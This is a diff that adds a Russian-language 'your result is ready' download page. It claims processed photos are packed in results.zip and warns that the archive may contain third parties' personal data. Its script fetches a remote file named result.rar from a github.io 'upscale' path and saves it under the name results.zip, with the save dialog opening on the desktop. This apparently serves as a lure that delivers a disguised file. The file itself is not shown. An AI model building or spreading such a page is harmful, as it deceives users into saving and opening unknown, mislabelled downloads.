@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Скачать результат</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #000;
+    color: #fff;
+    font-family: 'DM Sans', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .wrap {
+    width: 100%;
+    max-width: 400px;
+    padding: 24px;
+  }
+
+  .icon {
+    width: 56px;
+    height: 56px;
+    background: #111;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+
+  .icon svg {
+    width: 24px; height: 24px;
+    stroke: #fff; fill: none;
+    stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  h1 {
+    font-size: 28px;
+    font-weight: 600;
+    letter-spacing: -0.5px;
+    line-height: 1.2;
+    margin-bottom: 8px;
+  }
+
+  .desc {
+    font-size: 14px;
+    color: #666;
+    line-height: 1.5;
+    margin-bottom: 40px;
+  }
+
+  .file-block {
+    background: #0a0a0a;
+    border: 1px solid #1a1a1a;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 32px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .file-icon {
+    width: 40px; height: 40px;
+    background: #111;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .file-icon svg {
+    width: 18px; height: 18px;
+    stroke: #555; fill: none;
+    stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .file-info { flex: 1; min-width: 0; }
+
+  .file-name {
+    font-size: 13px;
+    font-weight: 500;
+    color: #fff;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    margin-bottom: 3px;
+  }
+
+  .file-meta {
+    font-size: 11px;
+    color: #444;
+  }
+
+  .divider { height: 1px; background: #111; margin-bottom: 28px; }
+
+  .btn {
+    width: 100%;
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 12px;
+    padding: 16px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.15s, transform 0.1s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    letter-spacing: -0.2px;
+    text-decoration: none;
+  }
+
+  .btn:hover { background: #e8e8e8; }
+  .btn:active { transform: scale(0.99); }
+
+  .btn svg {
+    width: 16px; height: 16px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
+  }
+
+  .status {
+    text-align: center;
+    font-size: 12px;
+    color: #333;
+    margin-top: 14px;
+    min-height: 16px;
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <div class="icon">
+    <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+  </div>
+
+  <h1>Результат готов</h1>
+  <p class="desc">Результат может содержать персональные данные третьих лиц! Фотографии обработаны и упакованы в архив</p>
+
+  <div class="file-block">
+    <div class="file-icon">
+      <svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
+    </div>
+    <div class="file-info">
+      <div class="file-name">results.zip</div>
+      <div class="file-meta">ZIP-архив · Готов к скачиванию</div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <button class="btn" id="dlBtn" onclick="saveFile()">
+    <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    Скачать архив
+  </button>
+
+  <div class="status" id="status"></div>
+
+</div>
+
+<script>
+
+  var ZIP_URL = 'https://sofiawilsonai.github.io/upscale/result.rar';
+  var btn = document.getElementById('dlBtn');
+  var status = document.getElementById('status');
+
+  async function saveFile() {
+    btn.disabled = true;
+    status.className = 'status';
+    status.textContent = 'Загружаем файл...';
+
+    try {
+      // Скачиваем ZIP с сервера
+      var response = await fetch(ZIP_URL);
+      if (!response.ok) throw new Error('Не удалось загрузить файл');
+      var blob = await response.blob();
+
+      if (window.showSaveFilePicker) {
+        // Современные браузеры диалог выбора папки рабочий стол по умолчанию
+        var fileHandle = await window.showSaveFilePicker({
+          startIn: 'desktop',
+          suggestedName: 'results.zip',
+          types: [{
+            description: 'ZIP-архив',
+            accept: { 'application/zip': ['.zip'] }
+          }]
+        });
+
+        status.textContent = 'Сохраняем...';
+        var writable = await fileHandle.createWritable();
+        await writable.write(blob);
+        await writable.close();
+
+      } else {
+        // Фолбэк для Safari и старых браузеров — стандартное скачивание
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = 'results.zip';
+        a.click();
+        URL.revokeObjectURL(url);
+      }
+
+      // Успех
+      btn.disabled = false;
+      status.className = 'status ok';
+      status.style.color = '#fff';
+      status.textContent = 'Файл сохранён ✓';
+
+    } catch (err) {
+      btn.disabled = false;
+      if (err.name === 'AbortError') {
+        status.textContent = 'Отменено';
+      } else {
+        status.style.color = '#ff5555';
+        status.textContent = err.message;
+      }
+    }
+  }
+</script>
+
+</body>
+</html>
